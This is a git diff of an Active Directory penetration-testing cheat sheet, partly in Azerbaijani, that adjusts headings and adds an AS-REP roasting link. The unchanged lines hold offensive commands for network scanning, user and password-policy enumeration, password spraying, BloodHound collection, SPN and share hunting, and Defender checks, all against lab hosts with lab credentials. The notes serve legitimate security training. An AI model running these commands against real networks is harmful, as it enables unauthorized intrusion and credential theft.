@@ -6,7 +6,7 @@ https://wadcoms.github.io/
 ```
 ---
 
-# Host Reconnaissance and Network Enumeration
+### Host Reconnaissance and Network Enumeration
 
 ```
 # Find Active Hosts
@@ -16,23 +16,23 @@ sudo nmap -sn -n --max-retries 1 --max-rate 10 --data-length 24 192.168.1.0/24
 nmap -p- -Pn -T4 --min-rate 2000 --stats-every 50 --max-retries 2 10.10.10.10 ( Fast Scan )
 ```
 
-# Service Enumeration
+### Service Enumeration
 [Service Enumeration üçün bu fayllara bax](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Services)
 
-# Vulnerability Scanner
+### Vulnerability Scanner
 [Servislərə özəl zəiflikləri axtarmaq üçün](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Services/Services-Attacks)
 
-# Credentials
+### Credentials
 [Username və Password tapılması üçün](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Enumeration/Username_Password-Enumeration.md)
 
 
 
 # Active Directory Enumeration
 
-## LLMNR/mDNS/NB-NS Poisining
+### LLMNR/mDNS/NB-NS Poisining
 [LLMNR/mDNS/NB-NS Poisoning Faylına Get](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)
 
-## Password Policy
+### Password Policy
 ```
 1) crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
 
@@ -49,7 +49,7 @@ getdompwinfo
 Get-DomainPolicy
 ```
 
-## Enumerate Username
+### Enumerate Username
 ```
 https://github.com/insidetrust/statistically-likely-usernames
 https://github.com/initstring/linkedin2username
@@ -73,7 +73,7 @@ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
 
 ```
 
-## Password Spraying
+### Password Spraying
 ```
 # Linux
 for u in $(cat wordlist.txt);do rpcclient -U "username%password" -c "getusername;quit" 172.16.5.5 | grep Authority; done
@@ -120,7 +120,7 @@ https://github.com/dirkjanm/BloodHound.py
 sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
 ```
 
-## Credential Enumeration - From Windows
+### Credential Enumeration - From Windows
 ```
 # Active Directory Module
 
@@ -166,7 +166,7 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data -o result_snaffler.txt
 ```
 
-# Living off the Land
+### Living off the Land
 ```
 hostname
 Get-Host
@@ -191,3 +191,6 @@ sc query windefend
 Get-MpComputerStatus
 qwinsta
 ```
+
+### AS-REP Roasting
+[Pre-Auth bağlı userləri tapıb hash çəkmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)
